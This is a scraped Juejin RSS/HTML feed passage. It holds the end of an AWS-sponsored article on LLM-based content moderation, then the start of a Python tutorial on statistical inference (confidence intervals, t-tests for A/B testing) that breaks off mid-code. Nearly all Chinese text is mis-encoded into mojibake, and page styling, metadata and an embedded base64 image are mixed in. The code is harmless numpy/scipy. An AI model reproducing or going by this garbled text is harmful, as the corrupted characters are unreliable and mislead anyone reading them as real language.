<p>è¿™ä¸ªè¿‡ç¨‹çš„ä»·å€¼åœ¨äºï¼š</p>
<ul>
<li>å®ƒä¸ä»…æ˜¯ä¸€æ¬¡æ¨¡å‹è°ƒä¼˜å°è¯•ï¼Œè€Œæ˜¯ä¸€å¥—Â <strong>å¯å·¥ç¨‹åŒ–å¤åˆ¶çš„æ–¹æ³•è®º</strong>ï¼›</li>
<li>åœ¨Â <strong>UGC</strong> <strong>ç¤¾åŒºã€ç¤¾äº¤å¹³å°ã€ç›´æ’­å®¡æ ¸</strong>Â ç­‰åœºæ™¯ï¼Œéƒ½å¯ä»¥ç›´æ¥å¤ç”¨è¿™å¥—Â <strong>æç¤ºè¯ä¼˜åŒ– +</strong> <strong>æ¶æ„é—­ç¯</strong>Â çš„æ–¹æ¡ˆï¼›</li>
<li>é€šè¿‡Â <strong>æ—¥å¿—ã€åˆ¤ä¾‹åº“ã€è“ç»¿éƒ¨ç½²</strong>Â ç­‰å·¥ç¨‹å®è·µï¼Œæˆ‘ä»¬è®©å®¡æ ¸ç³»ç»Ÿå…·å¤‡äº†Â <strong>ä¸€è‡´æ€§ã€å¯è¿½æº¯æ€§å’Œå¿«é€Ÿè¿­ä»£èƒ½åŠ›</strong>ã€‚</li>
</ul>
<p>æœ€ç»ˆï¼Œè¿™ä¸ªé¡¹ç›®è®©æˆ‘ä»¬çœ‹åˆ°äº†Â <strong>å¤§è¯­è¨€æ¨¡å‹ +</strong> <strong>å·¥ç¨‹åŒ–è½åœ°</strong>Â åœ¨å†…å®¹å®¡æ ¸é¢†åŸŸçš„æ½œåŠ›ï¼š</p>
<ul>
<li><strong>æç¤ºè¯è°ƒä¼˜</strong>Â è®©æ¨¡å‹å¿«é€Ÿé€¼è¿‘ç”šè‡³è¶…è¶Šäººå·¥å®¡æ ¸çš„ä¸€è‡´æ€§ï¼›</li>
<li><strong>å·¥ç¨‹åŒ–æ¶æ„</strong>Â ç¡®ä¿ç³»ç»Ÿåœ¨Â <strong>é«˜å¹¶å‘ã€å¤§è§„æ¨¡å¤šè¯­è¨€</strong>Â å®¡æ ¸åœºæ™¯ä¸‹ä¾æ—§ç¨³å®šè¿è¡Œï¼›</li>
<li><strong>ç«¯åˆ°ç«¯é—­ç¯</strong>Â ä½¿å®¡æ ¸ç³»ç»Ÿä¸ä»…èƒ½è§£å†³å½“ä¸‹é—®é¢˜ï¼Œè¿˜èƒ½é€šè¿‡æ•°æ®å›æµä¸æ–­è‡ªæˆ‘è¿›åŒ–ã€‚</li>
</ul>
<p>*å‰è¿°ç‰¹å®šäºšé©¬é€Šäº‘ç§‘æŠ€ç”Ÿæˆå¼äººå·¥æ™ºèƒ½ç›¸å…³çš„æœåŠ¡ç›®å‰åœ¨äºšé©¬é€Šäº‘ç§‘æŠ€æµ·å¤–åŒºåŸŸå¯ç”¨ã€‚äºšé©¬é€Šäº‘ç§‘æŠ€ä¸­å›½åŒºåŸŸç›¸å…³äº‘æœåŠ¡ç”±è¥¿äº‘æ•°æ®å’Œå…‰ç¯æ–°ç½‘è¿è¥ï¼Œå…·ä½“ä¿¡æ¯ä»¥ä¸­å›½åŒºåŸŸå®˜ç½‘ä¸ºå‡†ã€‚</p>
<p><strong>æœ¬ç¯‡ä½œè€…</strong>
<img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/7c97474c05804f76a9aaec207af439bb~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Lqa6ams6YCK5LqR5byA5Y-R6ICF:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765763948&amp;x-signature=H5SQL8MHEiFJ%2FNbNyzoLqiI0eXE%3D" alt="1.webp" loading="lazy"/></p>
<blockquote>
<p>æœ¬æœŸæœ€æ–°å®éªŒã€Š<a href="https://link.juejin.cn?target=https%3A%2F%2Fdev.amazoncloud.cn%2Fexperience%2Fcloudlab%3Fid%3D6695e4c5e1432f239fae485f%26visitfrom%3D3P_Juejintail_0415%26sc_medium%3Downed%26sc_campaign%3Dcloudlab%26sc_channel%3D3P_Juejintail_0415" target="_blank" title="https://dev.amazoncloud.cn/experience/cloudlab?id=6695e4c5e1432f239fae485f&amp;visitfrom=3P_Juejintail_0415&amp;sc_medium=owned&amp;sc_campaign=cloudlab&amp;sc_channel=3P_Juejintail_0415" ref="nofollow noopener noreferrer">å¤šæ¨¡ä¸€ç«™é€š â€”â€” Amazon Bedrock ä¸Šçš„åŸºç¡€æ¨¡å‹åˆä½“éªŒ</a>ã€‹</p>
<p>âœ¨ ç²¾å¿ƒè®¾è®¡ï¼Œæ—¨åœ¨å¼•å¯¼æ‚¨æ·±å…¥æ¢ç´¢Amazon Bedrockçš„æ¨¡å‹é€‰æ‹©ä¸è°ƒç”¨ã€æ¨¡å‹è‡ªåŠ¨åŒ–è¯„ä¼°ä»¥åŠå®‰å…¨å›´æ (Guardrail)ç­‰é‡è¦åŠŸèƒ½ã€‚æ— éœ€ç®¡ç†åŸºç¡€è®¾æ–½ï¼Œåˆ©ç”¨äºšé©¬é€ŠæŠ€æœ¯ä¸ç”Ÿæ€ï¼Œå¿«é€Ÿé›†æˆä¸éƒ¨ç½²ç”Ÿæˆå¼AIæ¨¡å‹èƒ½åŠ›ã€‚</p>
<p>â©ï¸[<a href="https://link.juejin.cn?target=https%3A%2F%2Fdev.amazoncloud.cn%2Fexperience%2Fcloudlab%3Fid%3D6695e4c5e1432f239fae485f%26visitfrom%3D3P_Juejintail_0415%26sc_medium%3Downed%26sc_campaign%3Dcloudlab%26sc_channel%3D3P_Juejintail_0415" target="_blank" title="https://dev.amazoncloud.cn/experience/cloudlab?id=6695e4c5e1432f239fae485f&amp;visitfrom=3P_Juejintail_0415&amp;sc_medium=owned&amp;sc_campaign=cloudlab&amp;sc_channel=3P_Juejintail_0415" ref="nofollow noopener noreferrer">ç‚¹å‡»è¿›å…¥å®éªŒ</a>] å³åˆ»å¼€å¯  AI å¼€å‘ä¹‹æ—…</p>
<p>æ„å»ºæ— é™, æ¢ç´¢å¯ç¨‹ï¼</p>
</blockquote></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[æ•°æ®ä¼šè¯´è°ï¼Ÿä¸‰å¤§æ¨æ–­æ–¹æ³•å¸®ä½ â€œå®¡é—®â€æ•°æ®çœŸç›¸]]></title>    <link>https://juejin.cn/post/7581097111896571958</link>    <guid>https://juejin.cn/post/7581097111896571958</guid>    <pubDate>2025-12-08T12:26:42.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7581097111896571958" data-draft-id="7581117416811610155" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content=" æ•°æ®ä¼šè¯´è°ï¼Ÿä¸‰å¤§æ¨æ–­æ–¹æ³•å¸®ä½ â€œå®¡é—®â€æ•°æ®çœŸç›¸"/> <meta itemprop="keywords" content="Python,æ•°æ®åˆ†æ,åç«¯"/> <meta itemprop="datePublished" content="2025-12-08T12:26:42.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="databook"/> <meta itemprop="url" content="https://juejin.cn/user/3526889035006702"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
             æ•°æ®ä¼šè¯´è°ï¼Ÿä¸‰å¤§æ¨æ–­æ–¹æ³•å¸®ä½ â€œå®¡é—®â€æ•°æ®çœŸç›¸
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3526889035006702/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    databook
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-08T12:26:42.000Z" title="Mon Dec 08 2025 12:26:42 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-08
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»7åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{color:#595959;font-size:15px;font-family:-apple-system,system-ui,BlinkMacSystemFont,Helvetica Neue,PingFang SC,Hiragino Sans GB,Microsoft YaHei,Arial,sans-serif;background-image:linear-gradient(90deg,rgba(60,10,30,.04) 3%,transparent 0),linear-gradient(1turn,rgba(60,10,30,.04) 3%,transparent 0);background-size:20px 20px;background-position:50%}.markdown-body p{color:#595959;font-size:15px;line-height:2;font-weight:400}.markdown-body p+p{margin-top:16px}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{padding:30px 0;margin:0;color:#135ce0}.markdown-body h1{position:relative;text-align:center;font-size:22px;margin:50px 0}.markdown-body h1:before{position:absolute;content:"";top:-10px;left:50%;width:32px;height:32px;transform:translateX(-50%);background-size:100% 100%;opacity:.36;background-repeat:no-repeat;background:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAMAAABEpIrGAAAABGdBTUEAALGPC/xhBQAAACBjSFJNAAB6JgAAgIQAAPoAAACA6AAAdTAAAOpgAAA6mAAAF3CculE8AAABfVBMVEX///8Ad/8AgP8AgP8AgP8Aff8AgP8Af/8AgP8AVf8Af/8Af/8AgP8AgP8Af/8Afv8AAP8Afv8Afv8Aef8AgP8AdP8Afv8AgP8AgP8Acf8Ae/8AgP8Af/8AgP8Af/8Af/8AfP8Afv8AgP8Af/8Af/8Afv8Afv8AgP8Afv8AgP8Af/8Af/8AgP8AgP8Afv8AgP8Af/8AgP8AgP8AgP8Ae/8Afv8Af/8AgP8Af/8AgP8Af/8Af/8Aff8Af/8Abf8AgP8Af/8AgP8Af/8Af/8Afv8AgP8AgP8Afv8Afv8AgP8Af/8Aff8AgP8Afv8AgP8Aff8AgP8AfP8AgP8Ae/8AgP8Af/8AgP8AgP8AgP8Afv8AgP8AgP8AgP8Afv8AgP8AgP8AgP8AgP8AgP8Af/8AgP8Af/8Af/8Aev8Af/8AgP8Aff8Afv8AgP8AgP8AgP8Af/8AgP8Af/8Af/8AgP8Afv8AgP8AgP8AgP8AgP8Af/8AeP8Af/8Af/8Af//////rzEHnAAAAfXRSTlMAD7CCAivatxIDx5EMrP19AXdLEwgLR+6iCR/M0yLRzyFF7JupSXn8cw6v60Q0QeqzKtgeG237HMne850/6Qeq7QaZ+WdydHtj+OM3qENCMRYl1B3K2U7wnlWE/mhlirjkODa9FN/BF7/iNV/2kASNZpX1Wlf03C4stRGxgUPclqoAAAABYktHRACIBR1IAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAB3RJTUUH4gEaBzgZ4yeM3AAAAT9JREFUOMvNUldbwkAQvCAqsSBoABE7asSOBRUVVBQNNuy9996789+9cMFAMHnVebmdm+/bmdtbQv4dOFOW2UjPzgFyLfo6nweKfIMOBYWwFtmMPGz2Yj2pJI0JDq3udJW6VVbmKa9I192VQFV1ktXUAl5NB0cd4KpnORqsEO2ZIRpF9gJfE9Dckqq0KuZt7UAH5+8EPF3spjsRpCeQNO/tA/qDwIDA+OCQbBoKA8NOdjMySgcZGVM6jwcgRuUiSs0nlPFNSrEpJfU0jTLD6llqbvKxei7OzvkFNQohi0vAsj81+MoqsCaoPOQFgus/1LyxichW+hS2JWCHZ7VlF9jb187pIAYcHiViHAMnp5mTjJ8B5xeEXF4B1ze/fTh/C0h398DDI9HB07O8ci+vRBdvdGnfP4gBuM8vw7X/G3wDmFhFZEdxzjMAAAAldEVYdGRhdGU6Y3JlYXRlADIwMTgtMDEtMjZUMDc6NTY6MjUrMDE6MDA67pVWAAAAJXRFWHRkYXRlOm1vZGlmeQAyMDE4LTAxLTI2VDA3OjU2OjI1KzAxOjAwS7Mt6gAAABl0RVh0U29mdHdhcmUAd3d3Lmlua3NjYXBlLm9yZ5vuPBoAAAAWdEVYdFRpdGxlAGp1ZWppbl9sb2dvIGNvcHlxapmKAAAAV3pUWHRSYXcgcHJvZmlsZSB0eXBlIGlwdGMAAHic4/IMCHFWKCjKT8vMSeVSAAMjCy5jCxMjE0uTFAMTIESANMNkAyOzVCDL2NTIxMzEHMQHy4BIoEouAOoXEXTyQjWVAAAAAElFTkSuQmCC)}.markdown-body h2{position:relative;font-size:20px;border-left:4px solid;padding:0 0 0 10px;margin:30px 0}.markdown-body h3{font-size:16px}.markdown-body ul{list-style:disc outside;margin-left:2em;margin-top:1em}.markdown-body li{line-height:2;color:#595959}.markdown-body img.loaded{margin:0 auto;display:block}.markdown-body blockquote{background:#fff9f9;margin:2em 0;padding:2px 20px;border-left:4px solid #b2aec5}.markdown-body blockquote p{color:#666;line-height:2}.markdown-body a{color:#036aca;border-bottom:1px solid rgba(3,106,202,.8);font-weight:400;text-decoration:none}.markdown-body em strong,.markdown-body strong{color:#036aca}.markdown-body hr{border-top:1px solid #135ce0}.markdown-body pre{overflow:auto}.markdown-body code,.markdown-body pre{overflow:auto;position:relative;line-height:1.75;font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body table{border-collapse:collapse;margin:1rem 0;overflow-x:auto}.markdown-body table td,.markdown-body table th{border:1px solid #dfe2e5;padding:.6em 1em}.markdown-body table tr{border-top:1px solid #dfe2e5}.markdown-body table tr:nth-child(2n){background-color:#f6f8fa}</style><style data-highlight="">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>å¾ˆå¤šåˆšå…¥è¡Œç”šè‡³æƒ³å…¥è¡Œæ•°æ®åˆ†æçš„æœ‹å‹ï¼Œå¾€å¾€ä¼šé™·å…¥ä¸€ä¸ª<strong>è¯¯åŒº</strong>ï¼šä»¥ä¸ºæ•°æ®åˆ†æå°±æ˜¯ä¸åœåœ°<strong>åšæŠ¥è¡¨</strong>ã€<strong>ç”»é¥¼å›¾</strong>ã€‚</p>
<p>å…¶å®ï¼Œæ•°æ®åˆ†æçš„æ ¸å¿ƒé­…åŠ›åœ¨äº <strong>â€œæ¨æ–­â€â€”â€”å³è§å¾®çŸ¥è‘—</strong>ã€‚</p>
<p>åœ¨ç°å®ç”Ÿæ´»ä¸­ï¼Œæˆ‘ä»¬å¾ˆéš¾è·å–â€œå…¨é‡æ•°æ®â€ï¼ˆæ¯”å¦‚ä½ ä¸å¯èƒ½è°ƒæŸ¥å…¨å›½æ¯ä¸€ä¸ªäººçš„èº«é«˜ï¼‰ï¼Œé‚£ä¹ˆï¼Œå¦‚ä½•é€šè¿‡æ‰‹ä¸­çš„â€œå°æ ·æœ¬â€å»æ¨æµ‹â€œå¤§æ€»ä½“â€çš„è§„å¾‹ï¼Ÿ</p>
<p>è¿™å°±éœ€è¦ç”¨åˆ°ç»Ÿè®¡å­¦ä¸­çš„<strong>æ¨æ–­åˆ†æ</strong>ã€‚</p>
<p>æœ¬æ–‡å°†ç»“åˆä»£ç æ¥ä»‹ç»<strong>æ¨æ–­åˆ†æ</strong>ä¸­æœ€å¸¸ç”¨çš„ä¸‰å¤§æ–¹æ³•ï¼š<strong>å‚æ•°ä¼°è®¡</strong>ã€<strong>å‡è®¾æ£€éªŒ</strong>ã€<strong>éå‚æ•°æ£€éªŒ</strong>ã€‚</p>
<h2 data-id="heading-0">1. å‚æ•°ä¼°è®¡</h2>
<p>æƒ³è±¡ä½ åœ¨ç…®ä¸€é”…æ’éª¨æ±¤ã€‚ä½ æƒ³çŸ¥é“æ±¤å’¸ä¸å’¸ï¼Œä½ ä¸ä¼šæŠŠæ•´é”…æ±¤éƒ½å–å®Œï¼Œè€Œæ˜¯èˆ€èµ·ä¸€å‹ºå°ä¸€å°ã€‚</p>
<ul>
<li>é‚£ä¸€å‹ºæ±¤å°±æ˜¯<strong>æ ·æœ¬</strong>ã€‚</li>
<li>é‚£ä¸€å‹ºçš„å’¸åº¦å°±æ˜¯<strong>æ ·æœ¬ç»Ÿè®¡é‡</strong>ã€‚</li>
<li>æ•´é”…æ±¤çš„å’¸åº¦å°±æ˜¯æˆ‘ä»¬è¦çŒœçš„<strong>æ€»ä½“å‚æ•°</strong>ã€‚</li>
</ul>
<p><strong>å‚æ•°ä¼°è®¡</strong>å°±æ˜¯ï¼šæ ¹æ®æ ·æœ¬çš„ç‰¹å¾ï¼ˆæ¯”å¦‚<strong>æ ·æœ¬å‡å€¼</strong>ï¼‰ï¼Œå»ä¼°è®¡æ€»ä½“çš„ç‰¹å¾ï¼ˆæ¯”å¦‚<strong>æ€»ä½“å‡å€¼</strong>ï¼‰ã€‚</p>
<p>å®ƒé€šå¸¸åˆ†ä¸ºä¸¤ç§ï¼š</p>
<ul>
<li><strong>ç‚¹ä¼°è®¡</strong>ï¼šç›´æ¥è¯´â€œè¿™é”…æ±¤æ˜¯1.5%çš„ç›åº¦â€ã€‚ï¼ˆä½†è¿™å¾ˆå®¹æ˜“è¢«æ‰“è„¸ï¼Œå› ä¸ºå¤ªç»å¯¹ï¼‰</li>
<li><strong>åŒºé—´ä¼°è®¡</strong>ï¼šè¯´â€œè¿™é”…æ±¤çš„ç›åº¦åœ¨1.4%åˆ°1.6%ä¹‹é—´ï¼Œæˆ‘æœ‰95%çš„æŠŠæ¡â€ã€‚ï¼ˆè¿™å°±æ˜¯ç½®ä¿¡åŒºé—´ï¼Œæ›´ç§‘å­¦ï¼‰</li>
</ul>
<p><strong>åŒºé—´ä¼°è®¡</strong>æ˜¯æœ€å¸¸ä½¿ç”¨çš„æ–¹å¼ï¼Œä¸‹é¢é€šè¿‡ä¸€ä¸ªç¤ºä¾‹æ¥æ¼”ç¤º<strong>å‚æ•°ä¼°è®¡</strong>çš„å…·ä½“ä½¿ç”¨ã€‚</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">import</span> numpy <span class="hljs-keyword">as</span> np
<span class="hljs-keyword">from</span> scipy <span class="hljs-keyword">import</span> stats

<span class="hljs-comment"># 1. æ¨¡æ‹Ÿæ•°æ®</span>
np.random.seed(<span class="hljs-number">42</span>)
true_mean = <span class="hljs-number">15</span>  <span class="hljs-comment"># ä¸Šå¸è§†è§’çš„çœŸå®å‡å€¼</span>
sample_salaries = np.random.normal(loc=true_mean, scale=<span class="hljs-number">3</span>, size=<span class="hljs-number">100</span>)  <span class="hljs-comment"># æ¨¡æ‹Ÿ100ä¸ªæ ·æœ¬</span>

<span class="hljs-comment"># 2. è®¡ç®—ç»Ÿè®¡é‡</span>
sample_mean = np.mean(sample_salaries)
sample_std = np.std(sample_salaries, ddof=<span class="hljs-number">1</span>)
n = <span class="hljs-built_in">len</span>(sample_salaries)

<span class="hljs-comment"># è®¡ç®—95%ç½®ä¿¡åŒºé—´</span>
<span class="hljs-comment"># è¿™é‡Œçš„ scale ä½¿ç”¨çš„æ˜¯æ ‡å‡†è¯¯ (Standard Error) = æ ·æœ¬æ ‡å‡†å·® / sqrt(n)</span>
conf_int = stats.t.interval(
    confidence=<span class="hljs-number">0.95</span>, df=n - <span class="hljs-number">1</span>, loc=sample_mean, scale=sample_std / np.sqrt(n)
)
lower_bound, upper_bound = conf_int

<span class="hljs-built_in">print</span>(<span class="hljs-string">f"æ ·æœ¬å‡å€¼: <span class="hljs-subst">{sample_mean:<span class="hljs-number">.2</span>f}</span>k"</span>)
<span class="hljs-built_in">print</span>(<span class="hljs-string">f"95%ç½®ä¿¡åŒºé—´: [<span class="hljs-subst">{lower_bound:<span class="hljs-number">.2</span>f}</span>k, <span class="hljs-subst">{upper_bound:<span class="hljs-number">.2</span>f}</span>k]"</span>)

<span class="hljs-comment"># è¿è¡Œç»“æœï¼š</span>
<span class="hljs-string">'''
æ ·æœ¬å‡å€¼: 14.69k
95%ç½®ä¿¡åŒºé—´: [14.15k, 15.23k]
'''</span>
</code></pre>
<p>å›¾å½¢åŒ–ä¹‹åçš„ç»“æœå¦‚ä¸‹ï¼š</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/2485481dfd374b6f958cd86bf1d60464~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgZGF0YWJvb2s=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765801601&amp;x-signature=jHE5ZnE12Qk9cAi9MC1r1J64vjU%3D" alt="" loading="lazy"/></p>
<p>ä»å›¾ä¸­å¯ä»¥çœ‹å‡ºï¼š</p>
<ol>
<li><strong>ç°è‰²çš„æ•£ç‚¹</strong>ï¼šæ˜¯ä½ è°ƒç ”çš„é‚£100ä¸ªæ•°æ®åˆ†æå¸ˆçš„å·¥èµ„ã€‚ä½ ä¼šå‘ç°æœ‰çš„é«˜æœ‰çš„ä½ï¼Œæ•£è½åœ¨å„åœ°ã€‚</li>
<li><strong>è“è‰²çš„ç‚¹å’Œæ¨ªçº¿</strong>ï¼š</li>
</ol>
<ul>
<li><strong>è“ç‚¹</strong>æ˜¯ä½ ç®—å‡ºæ¥çš„æ ·æœ¬å‡å€¼ï¼ˆçº¦14.67kï¼‰ï¼Œè™½ç„¶ä¸å®Œå…¨ç­‰äºçœŸå®çš„15kï¼Œä½†å¾ˆæ¥è¿‘ã€‚</li>
<li><strong>è“è‰²çš„æ¨ªçº¿</strong>å°±æ˜¯ç½®ä¿¡åŒºé—´ã€‚å®ƒçš„å«ä¹‰æ˜¯ï¼šâ€œè™½ç„¶æˆ‘ä¸çŸ¥é“ç¡®åˆ‡æ•°å­—ï¼Œä½†æˆ‘æ•¢æ‰“èµŒï¼ŒçœŸå®æ•°å­—å°±åœ¨è¿™æ ¹è“çº¿çš„èŒƒå›´å†…ã€‚â€</li>
</ul>
<ol start="3">
<li><strong>çº¢è‰²çš„è™šçº¿</strong>ï¼šè¿™æ˜¯çœŸå®çš„æ€»ä½“å‡å€¼ï¼ˆ15kï¼‰ã€‚</li>
<li><strong>ç»“è®º</strong>ï¼šä½ å¯ä»¥æ¸…æ¥šåœ°çœ‹åˆ°ï¼Œçº¢è‰²çš„è™šçº¿ç¡®å®ç©¿è¿‡äº†è“è‰²çš„æ¨ªçº¿ã€‚æ­å–œä½ ï¼è¿™æ¬¡â€œå‚æ•°ä¼°è®¡â€æˆåŠŸæ•è·äº†çœŸç†ï¼</li>
</ol>
<p>æ•°æ®åˆ†æä¸æ˜¯ç®—å‘½ï¼Œç®—å‡ºæ¥çš„ä¸æ˜¯ä¸€ä¸ªæ­»çš„æ•°å­—ï¼Œè€Œæ˜¯ä¸€ä¸ªç§‘å­¦çš„èŒƒå›´ã€‚</p>
<p>æˆ‘ä»¬å°±æ˜¯ç”¨<strong>å‚æ•°ä¼°è®¡</strong>çš„æ–¹æ³•ï¼Œåœ¨ä¸ç¡®å®šæ€§ä¸­å¯»æ‰¾ç¡®å®šæ€§ã€‚</p>
<h2 data-id="heading-1">2. å‡è®¾æ£€éªŒ</h2>
<p><strong>å‡è®¾æ£€éªŒ</strong>æ˜¯æ•°æ®åˆ†æä¸­æœ€å¸¸ç”¨çš„å†³ç­–å·¥å…·ã€‚å®ƒçš„é€»è¾‘æ˜¯ï¼š<strong>å…ˆç«‹ä¸€ä¸ªFlagï¼ˆå‡è®¾ï¼‰ï¼Œç„¶åçœ‹è¯æ®ï¼ˆæ•°æ®ï¼‰æ˜¯å¦æ‰“è„¸</strong>ã€‚</p>
<ul>
<li><strong>åŸå‡è®¾</strong> ï¼šé€šå¸¸ä»£è¡¨â€œæ— äº‹å‘ç”Ÿâ€ã€â€œæ²¡æœ‰å˜åŒ–â€ã€â€œè¿æ°”å¥½â€ã€‚</li>
<li><strong>å¤‡æ‹©å‡è®¾</strong>ï¼šé€šå¸¸ä»£è¡¨â€œæœ‰äº‹å‘ç”Ÿâ€ã€â€œçœŸçš„æœ‰æ•ˆæœâ€ã€‚</li>
<li><strong>På€¼</strong>ï¼šè¡¨ç¤ºåŸå‡è®¾æˆç«‹æ—¶ï¼Œå‡ºç°å½“å‰æ•°æ®çš„æ¦‚ç‡ã€‚På€¼è¶Šå°ï¼Œè¯´æ˜åŸå‡è®¾è¶Šä¸é è°±ï¼ˆé€šå¸¸ä»¥0.05ä¸ºç•Œé™ï¼‰ã€‚</li>
</ul>
<p>ä¸‹é¢é€šè¿‡ä¸€ä¸ªç”µå•†APPçš„A/Bæµ‹è¯•åœºæ™¯ï¼Œæ¥æ¼”ç¤º<strong>å‡è®¾æ£€éªŒ</strong>çš„ä½¿ç”¨ã€‚</p>
<p>å‡è®¾æŸç”µå•†APPæƒ³æŠŠ <strong>â€œè´­ä¹°â€</strong> æŒ‰é’®ä» <strong>è“è‰²</strong> æ”¹æˆ <strong>çº¢è‰²</strong> ã€‚</p>
<ul>
<li><strong>åŸå‡è®¾</strong>ï¼šçº¢è‰²æŒ‰é’®å’Œè“è‰²æŒ‰é’®çš„è½¬åŒ–ç‡æ²¡åŒºåˆ«ï¼ˆå·®åˆ«çº¯å±å¶ç„¶ï¼‰ã€‚</li>
<li><strong>å¤‡æ‹©å‡è®¾</strong>ï¼šçº¢è‰²æŒ‰é’®çš„è½¬åŒ–ç‡æ˜¾è‘—é«˜äºè“è‰²æŒ‰é’®ã€‚</li>
</ul>
<p>æˆ‘ä»¬é‡‡é›†äº†ä¸¤ç»„ç”¨æˆ·çš„æ¶ˆè´¹é‡‘é¢æ•°æ®æ¥è¿›è¡ŒTæ£€éªŒã€‚</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># 1. æ¨¡æ‹ŸABæµ‹è¯•æ•°æ®</span>
<span class="hljs-comment"># è“è‰²æŒ‰é’®ç»„ï¼ˆå¯¹ç…§ç»„ï¼‰ï¼šå¹³å‡æ¶ˆè´¹ 100å…ƒ</span>
group_blue = np.random.normal(loc=<span class="hljs-number">100</span>, scale=<span class="hljs-number">20</span>, size=<span class="hljs-number">1000</span>)
<span class="hljs-comment"># çº¢è‰²æŒ‰é’®ç»„ï¼ˆå®éªŒç»„ï¼‰ï¼šå¹³å‡æ¶ˆè´¹ 105å…ƒ (æˆ‘ä»¬è¦æ£€éªŒè¿™ä¸ªæå‡æ˜¯å¦æ˜¾è‘—)</span>
group_red = np.random.normal(loc=<span class="hljs-number">105</span>, scale=<span class="hljs-number">25</span>, size=<span class="hljs-number">1000</span>)

<span class="hljs-comment"># 2. è¿›è¡Œç‹¬ç«‹æ ·æœ¬Tæ£€éªŒ (T-test)</span>
t_stat, p_val = stats.ttest_ind(group_blue, group_red)

